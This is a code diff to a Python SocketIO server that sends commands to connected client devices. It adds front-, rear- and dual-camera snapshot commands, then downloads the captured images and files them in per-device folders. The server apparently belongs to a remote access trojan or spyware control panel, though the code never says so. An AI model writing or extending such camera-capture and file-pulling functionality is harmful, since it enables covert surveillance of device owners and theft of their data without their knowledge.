@@ -986,23 +986,55 @@ def handle_command(data):
             return
 
     result = send_command_to_client(client_id, command)
-    
-    if command == "snapshot" and result.get('success'):
+
+    def snapshot_save_path(remote_path):
+        filename = os.path.basename(remote_path)
+        sys_info = clients.get(client_id, {}).get('sys_info', '') or 'unknown_device'
+        device_dir = os.path.join(os.path.dirname(__file__), 'snapshots', sys_info)
+        return os.path.join(device_dir, filename)
+
+    if command in ("snapshot", "snapshot_front", "snapshot_rear") and result.get('success'):
         response_text = result.get('response', '')
         if response_text.startswith("SNAPSHOT_READY "):
             filepath = response_text.split(" ", 1)[1].strip()
             emit('command_response', {'success': True, 'response': f'Snapshot taken, starting download... ({filepath})', 'client_id': client_id, 'command': command})
-            
-            def do_snapshot_download():
-                dl_res = send_command_to_client(client_id, f'download {filepath}')
-                socketio.emit('command_response', {**dl_res, 'client_id': client_id, 'command': f'download {filepath}'}, namespace='/')
-                
+
+            def do_snapshot_download(fp=filepath):
+                dl_res = send_command_to_client(client_id, f'download {fp}', save_path=snapshot_save_path(fp))
+                socketio.emit('command_response', {**dl_res, 'client_id': client_id, 'command': f'download {fp}'}, namespace='/')
+
             threading.Thread(target=do_snapshot_download, daemon=True).start()
             return
-            
-        elif response_text.startswith("Error:"):
-            # just pass through the error
-            pass
+
+    elif command == "snapshot_both" and result.get('success'):
+        response_text = result.get('response', '')
+        if response_text.startswith("SNAPSHOT_BOTH_READY "):
+            parts = response_text.split(" ")
+            front_path = parts[1] if len(parts) > 1 else None
+            rear_path = parts[2] if len(parts) > 2 else None
+            emit('command_response', {'success': True, 'response': f'Both snapshots taken, starting downloads...', 'client_id': client_id, 'command': command})
+
+            def do_both_download(fp=front_path, rp=rear_path):
+                if fp:
+                    dl_front = send_command_to_client(client_id, f'download {fp}', save_path=snapshot_save_path(fp))
+                    socketio.emit('command_response', {**dl_front, 'client_id': client_id, 'command': f'download {fp}'}, namespace='/')
+                if rp:
+                    dl_rear = send_command_to_client(client_id, f'download {rp}', save_path=snapshot_save_path(rp))
+                    socketio.emit('command_response', {**dl_rear, 'client_id': client_id, 'command': f'download {rp}'}, namespace='/')
+
+            threading.Thread(target=do_both_download, daemon=True).start()
+            return
+        elif response_text.startswith("SNAPSHOT_READY "):
+            # Only one camera succeeded
+            filepath = response_text.split(" ", 1)[1].strip()
+            emit('command_response', {'success': True, 'response': f'One camera captured, starting download... ({filepath})', 'client_id': client_id, 'command': command})
+
+            def do_partial_download(fp=filepath):
+                dl_res = send_command_to_client(client_id, f'download {fp}', save_path=snapshot_save_path(fp))
+                socketio.emit('command_response', {**dl_res, 'client_id': client_id, 'command': f'download {fp}'}, namespace='/')
+
+            threading.Thread(target=do_partial_download, daemon=True).start()
+            return
 
     emit('command_response', {**result, 'client_id': client_id, 'command': command})
 
